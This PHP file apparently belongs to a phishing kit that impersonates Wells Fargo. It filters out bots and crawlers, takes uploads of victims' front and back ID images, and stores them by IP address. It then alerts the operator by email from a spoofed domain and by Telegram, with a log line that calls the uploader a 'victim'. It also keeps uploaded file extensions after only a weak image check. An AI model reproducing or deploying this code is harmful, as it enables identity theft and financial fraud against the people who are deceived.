<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
include "../req/config.php";

$uploadok=0;
$PublicIP = $_SERVER['REMOTE_ADDR'];
if (($_FILES['my_filefront']['name']!="") && getimagesize($_FILES['my_filefront']['tmp_name']) !== false){
	$file = $_FILES['my_filefront']['name'];
	$path = pathinfo($file);
	$filename = $PublicIP."_Front_ID";
	$ext = $path['extension'];
	$temp_name = $_FILES['my_filefront']['tmp_name'];
	@mkdir('../../rst');
	$path_filename_ext = "../../rst/".$filename.".".$ext;
	$uploadok=1;
	move_uploaded_file($temp_name,$path_filename_ext);}
	
if (($_FILES['my_fileback']['name']!="") && getimagesize($_FILES['my_fileback']['tmp_name']) !== false){
	$file = $_FILES['my_fileback']['name'];
	$path = pathinfo($file);
	$filename = $PublicIP."_Back__ID";
	$ext = $path['extension'];
	$temp_name = $_FILES['my_fileback']['tmp_name'];
	@mkdir('../../rst');
	$path_filename_ext = "../../rst/".$filename.".".$ext;
	$uploadok=1;
	move_uploaded_file($temp_name,$path_filename_ext);}
	
if($uploadok==1){
$Info_LOG="ID UPLOADED BY VICTIM IP: $PublicIP
Check RST folder for IMAGES with ipname";
if($Send_Email == 1 ){
            $subject = $PublicIP.' 🦞🦞 WELLS ID UPLOADED';$headers = 'From: YoCHI <yochmoneywellsf@wellsfofyoch.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			mail($to, $subject, $Info_LOG, $headers);
		};
if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
	};
header("location:complete?session00nI_IX=".md5(rand(100, 999999999))."");

?>



